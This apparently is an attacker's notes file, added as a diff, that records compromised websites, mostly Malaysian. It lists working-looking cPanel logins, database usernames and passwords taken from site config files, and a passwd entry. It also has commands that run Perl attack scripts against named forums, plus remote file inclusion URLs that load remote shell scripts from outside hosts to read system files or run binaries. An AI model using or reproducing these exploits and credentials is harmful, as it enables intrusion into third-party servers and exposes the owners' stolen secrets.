@@ -1,0 +1,111 @@
+= 'iptura';
+'volvokbc50';
+://www.iptura.edu.my
+[200]	antzcorp:antzcorp		Proxy: :	http://antzcorp:antzcorp@hpcanopy.com.my:2082/
+[200]	democp:democp		Proxy: :	http://democp:democp@hpcanopy.com.my:2082/
+[200]	hiangkee:hiangkee		Proxy: :	http://hiangkee:hiangkee@hpcanopy.com.my:2082/
+[200]	expedito:expedito		Proxy: :	http://expedito:expedito@hpcanopy.com.my:2082/
+[200]	hpcanopy:hpcanopy		Proxy: :	http://hpcanopy:hpcanopy@hpcanopy.com.my:2082/
+[200]	kiki:kiki		Proxy: :	http://kiki:kiki@hpcanopy.com.my:2082/
+[200]	sisi:sisi		Proxy: :	http://sisi:sisi@hpcanopy.com.my:2082/
+
+
+http://www.iptura.edu.my/info.php
+http://taipingconnection.com/files/info.php
+
+http://geocities.com/kuris_keren/alat/bantai.pl
+chmod 755 bantai.pl
+perl bantai.pl www.manchesterunited.com.my / 328 "id"
+
+http://www.asianbike.com/images/info.php
+
+forum.cari.com.my / 328 "id"
+
+   $tkConfig['db']['dbPort']       =   '3306';          /* Set the Port your Database is listening to */
+   $tkConfig['db']['dbUser']       =   'imalay_azman';          /* Set the database-user-name */
+   $tkConfig['db']['dbPass']       =   'kursi313';              /* Set the 
+http://satu.pelayanweb.com/~imalay/log.php
+
+perl wow.pl www.focuslearning.com.my /phpbb/ 2 "id"
+
+kuching:x:32540:1042::/home/kuching:/usr/local/cpanel/bin/noshell
+http://www.9kings.com/log.php
+http://69.93.103.210/~demo/info.php
+
+$dbhost = "localhost";
+$dbuname = "9kingsadm";
+$dbpass = "9kings5604";
+$dbname = "9kings_db";
+$prefix = "nuke";
+$user_prefix = "nuke";
+$dbtype = "MySQL";
+
+
+
+http://www.younghorizons.com/stats/
+http://thevision.com.my/stats
+http://www.hospitality.com.my/stats
+http://www.bumi-marine.com.my/stats
+http://www.excess-sparkle.com.my/stats
+http://www.primepr.com.my/stats
+http://satu.pelayanweb.com/~totonox/
+http://orbitdesign.com.my
+http://kewangan.lkim.net.my
+http://jalinan-ansari.com/
+http://www.asamboi.org
+http://freeforum-my.com/ 
+http://alloexpat.com/
+http://clicklogistic.com.my
+http://ssc.edu.my
+http://www.myklcc.net
+www.iptura.edu.my
+ssc.edu.my
+siner.net.my
+mindaplus.com
+sinet.net.my
+http://hpcanopy.com.my
+hiangkee.com
+expeditors-mgtserv.com
+http://kewangan.lkim.net.my/
+http://hpcanopy.com.my/
+http://irc-malaysia.com/index.htm
+http://www.nswanderers.com/portal/modules/coppermine/themes/default/theme.php?THEME_DIR=http://geocities.com/mandek_01/strum.txt?&cmd=cat%20/etc/named.conf
+http://musixpress.com 
+$dbloginid = "musixpress";
+$dbpassword = "MUSI0412PRESS";
+'ISARA2272';
+isarawak
+http://isarawak.com.my
+mosConfig_user = 'uca';
+$mosConfig_password = 'UCAUCA0055';
+http://uca.org.my/
+login: ikhlas
+password: IKH9970S
+http://ikhlas.com.my
+   // Database Username
+        // Your database user account on the host
+        define('XOOPS_DB_USER', 'hpenang');
+
+        // Database Password
+        // Password for your database user account
+        define('XOOPS_DB_PASS', 'HARIA1508');
+
+        // Database Name
+www.haria-penang.com
+http://www.cherasnet.com/klmain/modules/coppermine/themes/default/theme.php?THEME_DIR=http://geocities.com/mandek_01/strum.txt?&cmd=/tmp/./sincan2
+219.94.119.133 << ipnya injek
+http://www.cherasnet.com/info.php
+http://sapphire:sapphire@67.18.129.42:2082/
+http://sapphireinfo.net/info.php
+
+[200]	gtdnzco:gtdnzco		Proxy: :	http://gtdnzco:gtdnzco@sapphireinfo.net:2082/
+[200]	gripon:gripon		Proxy: :	http://gripon:gripon@sapphireinfo.net:2082/
+[200]	kdsc:kdsc		Proxy: :	http://kdsc:kdsc@sapphireinfo.net:2082/
+[200]	pushkar:pushkar		Proxy: :	http://pushkar:pushkar@sapphireinfo.net:2082/
+[200]	rajagro:rajagro		Proxy: :	http://rajagro:rajagro@sapphireinfo.net:2082/
+[200]	vaibhav:vaibhav		Proxy: :	http://vaibhav:vaibhav@sapphireinfo.net:2082/
+[200]	turbo:turbo		Proxy: :	http://turbo:turbo@sapphireinfo.net:2082/
+[200]	webdal:webdal		Proxy: :	http://webdal:webdal@sapphireinfo.net:2082/
+[200]	vipul:vipul		Proxy: :	http://vipul:vipul@sapphireinfo.net:2082/
+
+http://www.cba.or.th/document/update.php?filename=http://freewebs.com/oikumene/s2.txt?&cmd=cd%20/var/tmp/date;./httpd
